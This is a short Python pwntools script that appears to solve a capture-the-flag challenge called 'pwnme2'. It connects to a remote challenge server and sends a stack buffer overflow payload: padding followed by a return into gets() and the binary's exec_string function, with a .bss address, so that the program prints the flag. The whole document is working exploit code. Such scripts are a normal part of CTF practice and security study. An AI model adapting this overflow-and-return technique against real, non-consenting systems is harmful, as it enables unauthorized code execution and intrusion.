from pwn import *

context.log_level = 'debug'

#p = process('./pwnme2')
p = remote('node4.buuoj.cn', 27413)
elf = ELF('./pwnme2')

bss = 0x804A060
gets = elf.plt['gets']
flag = elf.sym['exec_string']

payload = b'a' * (  0x6c + 4 ) + p32(gets) + p32(flag) + p32(bss)

p.sendlineafter(b'Please input:\n', payload)
p.sendline(b'flag')

print(p.recvall())